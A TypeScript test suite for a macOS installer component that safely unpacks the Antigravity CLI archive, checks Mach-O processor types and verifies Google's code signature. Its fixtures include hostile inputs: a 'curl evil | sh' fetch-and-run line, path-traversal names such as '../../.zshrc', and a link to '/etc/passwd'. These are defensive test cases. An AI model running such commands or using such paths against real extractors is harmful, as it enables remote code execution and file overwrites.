import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import zlib from 'node:zlib'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import {
  AntigravityCliArchiveError, antigravityCliTeamIdentifier, extractAntigravityCliArchive, readMachOArchitectures,
  verifyDarwinAntigravityCli, type AntigravityCliDarwinProcess,
} from './antigravity-cli-macos'
import { CommandRunnerError, type CommandErrorCode, type CommandResult } from './command-runner'
import { DarwinCliProvenanceError } from './macos-code-signing'

// Archives are assembled here byte by byte, in the layout Google's cli_mac_*.tar.gz had on
// 2026-11-23 (GNU tar, one regular `antigravity`, mode 0755) and in the variants a Mac's own tar
// or a rebuilt archive would produce. Nothing is downloaded and nothing extracted is run.

interface TarEntry {
  name: string
  type?: string
  data?: Buffer
  /** Overrides the recorded size, for entries whose data does not match their header. */
  size?: number
  mode?: number
  format?: 'gnu' | 'posix' | 'v7'
  prefix?: string
  corruptChecksum?: boolean
}

function writeOctal(header: Buffer, offset: number, length: number, value: number): void {
  header.write(`${value.toString(8).padStart(length - 1, '0')}\0`, offset, length, 'latin1')
}

function tarHeader(entry: TarEntry): Buffer {
  const header = Buffer.alloc(512)
  header.write(entry.name, 0, 100, 'utf8')
  writeOctal(header, 100, 8, entry.mode ?? 0o755)
  writeOctal(header, 108, 8, 501)
  writeOctal(header, 116, 8, 20)
  writeOctal(header, 124, 12, entry.size ?? entry.data?.length ?? 0)
  writeOctal(header, 136, 12, 1_763_856_000)
  header.write(entry.type ?? '0', 156, 1, 'latin1')
  const format = entry.format ?? 'gnu'
  if (format === 'gnu') header.write('ustar  \0', 257, 8, 'latin1')
  if (format === 'posix') {
    header.write('ustar\0', 257, 6, 'latin1')
    header.write('00', 263, 2, 'latin1')
    if (entry.prefix) header.write(entry.prefix, 345, 155, 'utf8')
  }
  header.fill(0x20, 148, 156)
  let sum = 0
  for (const byte of header) sum += byte
  if (entry.corruptChecksum) sum += 1
  header.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 8, 'latin1')
  return header
}

function tarEntry(entry: TarEntry): Buffer {
  const data = entry.data ?? Buffer.alloc(0)
  const padding = (512 - (data.length % 512)) % 512
  return Buffer.concat([tarHeader(entry), data, Buffer.alloc(padding)])
}

function paxEntry(records: Record<string, string>, extra: Partial<TarEntry> = {}): Buffer {
  const lines = Object.entries(records).map(([key, value]) => {
    const body = ` ${key}=${value}\n`
    let length = body.length + 1
    while (`${length}${body}`.length !== length) length += 1
    return `${length}${body}`
  })
  return tarEntry({ name: 'PaxHeader/antigravity', type: 'x', format: 'posix', data: Buffer.from(lines.join(''), 'utf8'), ...extra })
}

// GNU tar pads the archive to a 10240-byte record with zeros after the two end blocks.
function tarArchive(entries: Buffer[], options: { endBlocks?: number; record?: boolean } = {}): Buffer {
  const body = Buffer.concat([...entries, Buffer.alloc(512 * (options.endBlocks ?? 2))])
  if (options.record === false) return body
  const padding = (10240 - (body.length % 10240)) % 10240
  return Buffer.concat([body, Buffer.alloc(padding)])
}

const executable = Buffer.concat([Buffer.from([0xcf, 0xfa, 0xed, 0xfe, 0x0c, 0x00, 0x00, 0x01]), Buffer.alloc(3000, 0x41)])

let workspace: string

beforeEach(() => {
  workspace = fs.mkdtempSync(path.join(os.tmpdir(), 'xingmang-agy-macos-'))
})

afterEach(() => {
  fs.rmSync(workspace, { recursive: true, force: true })
})

function writeArchive(content: Buffer, gzip = true): string {
  const archivePath = path.join(workspace, 'cli_mac_arm64.tar.gz')
  fs.writeFileSync(archivePath, gzip ? zlib.gzipSync(content) : content)
  return archivePath
}

async function extract(content: Buffer, maximumBytes?: number) {
  const destination = path.join(workspace, 'agy')
  const bytes = await extractAntigravityCliArchive(writeArchive(content), destination, maximumBytes)
  return { destination, bytes }
}

async function refusal(content: Buffer | string, maximumBytes?: number): Promise<Error> {
  const destination = path.join(workspace, 'agy')
  const archivePath = typeof content === 'string' ? content : writeArchive(content)
  const failure = await extractAntigravityCliArchive(archivePath, destination, maximumBytes).then(
    () => { throw new Error('the archive was accepted') },
    (error: unknown) => error as Error,
  )
  // Nothing half-written is left where the installer would pick it up.
  expect(fs.existsSync(destination)).toBe(false)
  return failure
}

describe('Antigravity CLI archive', () => {
  it('unpacks the one executable from Google\'s GNU tar layout', async () => {
    const { destination, bytes } = await extract(tarArchive([tarEntry({ name: 'antigravity', data: executable })]))
    expect(bytes).toBe(executable.length)
    expect(fs.readFileSync(destination).equals(executable)).toBe(true)
    // The installer sets the final mode after verifying; the archive's 0755 is not carried over.
    if (process.platform !== 'win32') expect(fs.statSync(destination).mode & 0o777).toBe(0o600)
  })

  it('accepts the folder record, ./ names, AppleDouble metadata and pax headers a rebuilt archive would add', async () => {
    const archive = tarArchive([
      tarEntry({ name: './', type: '5', format: 'posix' }),
      tarEntry({ name: './._antigravity', format: 'posix', data: Buffer.alloc(300, 1) }),
      paxEntry({ 'LIBARCHIVE.xattr.com.apple.provenance': 'AQAA', mtime: '1763856000.5' }),
      tarEntry({ name: './antigravity', format: 'posix', data: executable }),
    ], { record: false })
    const { destination, bytes } = await extract(archive)
    expect(bytes).toBe(executable.length)
    expect(fs.readFileSync(destination).equals(executable)).toBe(true)
  })

  it('names the entry from a pax path record and from a POSIX prefix field', async () => {
    const renamed = tarArchive([paxEntry({ path: 'antigravity' }), tarEntry({ name: 'short-name', format: 'posix', data: executable })])
    expect((await extract(renamed)).bytes).toBe(executable.length)
    fs.rmSync(path.join(workspace, 'agy'))
    const prefixed = tarArchive([tarEntry({ name: 'antigravity', prefix: 'bin', format: 'posix', data: executable })])
    expect((await refusal(prefixed)).message).toContain('以外的文件')
  })

  it('skips a global pax header', async () => {
    const archive = tarArchive([tarEntry({ name: 'pax_global_header', type: 'g', format: 'posix', data: Buffer.from('52 comment=b3c1a0f0e5d2c4b6a8e0f2d4c6b8a0e2d4f6\n') }), tarEntry({ name: 'antigravity', data: executable })])
    expect((await extract(archive)).bytes).toBe(executable.length)
  })

  it.each([
    ['a symbolic link', [tarEntry({ name: 'antigravity', type: '2' })], '特殊条目'],
    ['a hard link', [tarEntry({ name: 'antigravity', type: '1' })], '特殊条目'],
    ['a folder of its own', [tarEntry({ name: 'bin/', type: '5' }), tarEntry({ name: 'antigravity', data: executable })], '特殊条目'],
    ['a device', [tarEntry({ name: 'antigravity', type: '3' })], '特殊条目'],
    ['a GNU long name', [tarEntry({ name: '././@LongLink', type: 'L', data: Buffer.from('antigravity\0') }), tarEntry({ name: 'x', data: executable })], '特殊条目'],
    ['a second file', [tarEntry({ name: 'antigravity', data: executable }), tarEntry({ name: 'README', data: Buffer.from('hi') })], '以外的文件'],
    ['a file in a subfolder', [tarEntry({ name: 'bin/antigravity', data: executable })], '以外的文件'],
    ['a path that climbs out', [tarEntry({ name: '../antigravity', data: executable })], '以外的文件'],
    ['an absolute path', [tarEntry({ name: '/usr/local/bin/antigravity', data: executable })], '以外的文件'],
    ['two executables', [tarEntry({ name: 'antigravity', data: executable }), tarEntry({ name: './antigravity', data: executable })], '两个'],
    ['a pax path pointing elsewhere', [paxEntry({ path: '../../.zshrc' }), tarEntry({ name: 'antigravity', format: 'posix', data: executable })], '以外的文件'],
    ['a pax size override', [paxEntry({ size: '99999' }), tarEntry({ name: 'antigravity', format: 'posix', data: executable })], '不认识的设置'],
    ['a pax link target', [paxEntry({ linkpath: '/etc/passwd' }), tarEntry({ name: 'antigravity', format: 'posix', data: executable })], '不认识的设置'],
    ['a malformed pax record', [tarEntry({ name: 'PaxHeader/x', type: 'x', format: 'posix', data: Buffer.from('99 path=antigravity\n') }), tarEntry({ name: 'antigravity', data: executable })], '扩展头无效'],
    ['an oversized pax header', [tarEntry({ name: 'PaxHeader/x', type: 'x', format: 'posix', data: Buffer.alloc(65 * 1024, 0x61) })], '扩展头太大'],
    ['oversized AppleDouble metadata', [tarEntry({ name: '._antigravity', data: Buffer.alloc(1024 * 1024 + 1) })], '附带的文件信息太大'],
    ['a folder record with data', [tarEntry({ name: './', type: '5', size: 512, data: Buffer.alloc(512) }), tarEntry({ name: 'antigravity', data: executable })], '条目大小无效'],
    ['only metadata', [tarEntry({ name: '._antigravity', data: Buffer.alloc(10) })], '里面没有 antigravity'],
    ['an empty executable', [tarEntry({ name: 'antigravity' })], '里面没有 antigravity'],
    ['a corrupted header', [tarEntry({ name: 'antigravity', data: executable, corruptChecksum: true })], '条目头校验不通过'],
    ['a pre-POSIX header', [tarEntry({ name: 'antigravity', format: 'v7', data: executable })], '不是 tar 格式'],
    ['too many entries', Array.from({ length: 17 }, () => tarEntry({ name: '._antigravity', data: Buffer.alloc(1) })), '条目太多'],
  ])('refuses an archive with %s', async (_label, entries, message) => {
    const failure = await refusal(tarArchive(entries))
    expect(failure).toBeInstanceOf(AntigravityCliArchiveError)
    expect(failure.message).toContain(message)
    expect(failure.message).toMatch(/^Antigravity 命令行安装包格式不对：/)
  })

  it('refuses an executable larger than the limit before writing it', async () => {
    const failure = await refusal(tarArchive([tarEntry({ name: 'antigravity', data: executable })]), executable.length - 1)
    expect(failure.message).toContain('程序太大')
  })

  it('refuses a header that declares an unreadable size', async () => {
    const header = tarHeader({ name: 'antigravity', data: executable })
    header.write('99999999999\0', 124, 12, 'latin1')
    header.fill(0x20, 148, 156)
    let sum = 0
    for (const byte of header) sum += byte
    header.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 8, 'latin1')
    expect((await refusal(tarArchive([header, executable, Buffer.alloc(512 - (executable.length % 512))]))).message).toContain('条目大小无效')
  })

  it('refuses an archive that stops early', async () => {
    const whole = tarArchive([tarEntry({ name: 'antigravity', data: executable })], { record: false })
    // Cut inside the file data, at the end block, and after a header.
    for (const length of [1024, 512 + Math.ceil(executable.length / 512) * 512, 512]) {
      expect((await refusal(whole.subarray(0, length))).message).toContain('安装包不完整')
    }
  })

  it('refuses anything but zero padding after the end of the archive', async () => {
    const trailing = Buffer.concat([tarArchive([tarEntry({ name: 'antigravity', data: executable })], { record: false }), Buffer.from('#!/bin/sh\n')])
    expect((await refusal(trailing)).message).toContain('结尾后面还有内容')
    // A second archive concatenated after the first one is not read past the end either.
    const concatenated = Buffer.concat([tarArchive([tarEntry({ name: 'antigravity', data: executable })]), tarArchive([tarEntry({ name: 'README', data: Buffer.from('x') })])])
    expect((await refusal(concatenated)).message).toContain('结尾后面还有内容')
  })

  it('refuses data that is not gzip and gzip that is cut short', async () => {
    const plain = tarArchive([tarEntry({ name: 'antigravity', data: executable })])
    const notGzip = writeArchive(plain, false)
    expect((await refusal(notGzip)).message).toContain('解压失败')
    const compressed = zlib.gzipSync(plain)
    const cut = path.join(workspace, 'cut.tar.gz')
    fs.writeFileSync(cut, compressed.subarray(0, compressed.length - 20))
    expect((await refusal(cut)).message).toMatch(/解压失败|安装包不完整/)
  })

  it('never overwrites a file already at the destination', async () => {
    const destination = path.join(workspace, 'agy')
    fs.writeFileSync(destination, 'already here')
    const archivePath = writeArchive(tarArchive([tarEntry({ name: 'antigravity', data: executable })]))
    await expect(extractAntigravityCliArchive(archivePath, destination)).rejects.toMatchObject({ code: 'EEXIST' })
    expect(fs.readFileSync(destination, 'utf8')).toBe('already here')
  })

  it('reads an archive whose executable spans many gzip chunks', async () => {
    const large = Buffer.alloc(3 * 1024 * 1024 + 7, 0x42)
    executable.copy(large)
    const { destination, bytes } = await extract(tarArchive([tarEntry({ name: 'antigravity', data: large })]))
    expect(bytes).toBe(large.length)
    expect(fs.readFileSync(destination).equals(large)).toBe(true)
  })
})

function thin(cpuType: number, magic = 0xfeedfacf): Buffer {
  const header = Buffer.alloc(32)
  header.writeUInt32LE(magic, 0)
  header.writeUInt32LE(cpuType, 4)
  return header
}

function fat(cpuTypes: number[], magic = 0xcafebabe, count = cpuTypes.length): Buffer {
  const entryBytes = magic === 0xcafebabe ? 20 : 32
  const header = Buffer.alloc(8 + cpuTypes.length * entryBytes)
  header.writeUInt32BE(magic, 0)
  header.writeUInt32BE(count, 4)
  cpuTypes.forEach((cpuType, index) => header.writeUInt32BE(cpuType, 8 + index * entryBytes))
  return header
}

const arm64 = 0x0100000c
const x8664 = 0x01000007

describe('Mach-O processor check', () => {
  it('reads thin and universal headers', () => {
    expect(readMachOArchitectures(thin(arm64))).toEqual(['arm64'])
    expect(readMachOArchitectures(thin(x8664))).toEqual(['x86_64'])
    expect(readMachOArchitectures(fat([x8664, arm64]))).toEqual(['x86_64', 'arm64'])
    expect(readMachOArchitectures(fat([arm64, arm64], 0xcafebabf))).toEqual(['arm64'])
  })

  it.each([
    ['too few bytes', Buffer.from([0xcf, 0xfa, 0xed])],
    ['a 32-bit Mach-O', thin(7, 0xfeedface)],
    ['an unknown processor', thin(0x12)],
    ['an ELF file', Buffer.from('\x7fELF\x02\x01\x01\0\0\0\0\0', 'latin1')],
    ['a Windows program', Buffer.from('MZ\x90\0\x03\0\0\0', 'latin1')],
    ['a shell script', Buffer.from('#!/bin/sh\ncurl evil | sh\n')],
    ['a universal header with no slices', fat([], 0xcafebabe, 0)],
    ['a universal header with too many slices', fat([arm64], 0xcafebabe, 9)],
    ['a universal header cut short', fat([arm64, x8664]).subarray(0, 30)],
  ])('finds no processor in %s', (_label, header) => {
    expect(readMachOArchitectures(header)).toEqual([])
  })
})

function commandFailure(code: CommandErrorCode): CommandRunnerError {
  return new CommandRunnerError(`codesign ${code}`, {
    code, executable: '/usr/bin/codesign', argv: [], exitCode: code === 'EXIT_NON_ZERO' ? 3 : null, signal: null,
    stdout: '', stderr: 'test requirement failed', outputBytes: 0, maxOutputBytes: 1024, durationMs: 1,
  })
}

const success: CommandResult = { executable: '/usr/bin/codesign', argv: [], exitCode: 0, signal: null, stdout: '', stderr: '', outputBytes: 0, durationMs: 1 }

describe('Antigravity CLI Developer ID check', () => {
  function writeExecutable(header: Buffer): string {
    const filePath = path.join(workspace, 'agy-check')
    fs.writeFileSync(filePath, Buffer.concat([header, Buffer.alloc(4096)]))
    return filePath
  }

  it('asks codesign for Google\'s Developer ID requirement on the exact file', async () => {
    const filePath = writeExecutable(fat([x8664, arm64]))
    const runProcess = vi.fn<(plan: AntigravityCliDarwinProcess) => Promise<CommandResult>>(async () => success)
    await expect(verifyDarwinAntigravityCli(filePath, 'arm64', runProcess)).resolves.toBeUndefined()
    await expect(verifyDarwinAntigravityCli(filePath, 'x64', runProcess)).resolves.toBeUndefined()
    expect(runProcess).toHaveBeenCalledTimes(2)
    const plan = runProcess.mock.calls[0][0]
    expect(plan.executable).toBe('/usr/bin/codesign')
    expect(plan.timeoutMs).toBe(120_000)
    expect(plan.argv.slice(0, 2)).toEqual(['--verify', '--strict'])
    expect(plan.argv[plan.argv.length - 1]).toBe(filePath)
    const requirement = plan.argv.find((argument) => argument.startsWith('-R='))
    expect(requirement).toContain('identifier "cli"')
    expect(requirement).toContain('anchor apple generic')
    expect(requirement).toContain(`certificate leaf[subject.OU] = "${antigravityCliTeamIdentifier}"`)
    expect(antigravityCliTeamIdentifier).toBe('EQHXZ8M8AV')
  })

  it.each([
    ['an Intel-only build on Apple silicon', thin(x8664), 'arm64'],
    ['an Apple silicon build on Intel', thin(arm64), 'x64'],
    ['something that is not a Mac program', Buffer.from('#!/bin/sh\n'), 'arm64'],
  ] as const)('refuses %s before running codesign', async (_label, header, architecture) => {
    const runProcess = vi.fn<(plan: AntigravityCliDarwinProcess) => Promise<CommandResult>>(async () => success)
    const failure = await verifyDarwinAntigravityCli(writeExecutable(header), architecture, runProcess).catch((error: unknown) => error)
    expect(failure).toBeInstanceOf(DarwinCliProvenanceError)
    expect((failure as Error).message).toBe('Antigravity 命令行的芯片和这台 Mac 对不上')
    expect(runProcess).not.toHaveBeenCalled()
  })

  it('treats a codesign refusal as somebody else\'s build', async () => {
    const refusedBy = commandFailure('EXIT_NON_ZERO')
    const failure = await verifyDarwinAntigravityCli(writeExecutable(thin(arm64)), 'arm64', async () => { throw refusedBy })
      .catch((error: unknown) => error)
    expect(failure).toBeInstanceOf(DarwinCliProvenanceError)
    expect((failure as Error).message).toBe('Antigravity 命令行的签名不是谷歌（EQHXZ8M8AV）的 Developer ID')
    expect((failure as Error).cause).toBe(refusedBy)
  })

  it.each(['TIMED_OUT', 'SPAWN_FAILED', 'ABORTED'] as const)('passes a codesign run that %s on unchanged', async (code) => {
    const error = commandFailure(code)
    await expect(verifyDarwinAntigravityCli(writeExecutable(thin(arm64)), 'arm64', async () => { throw error })).rejects.toBe(error)
  })
})
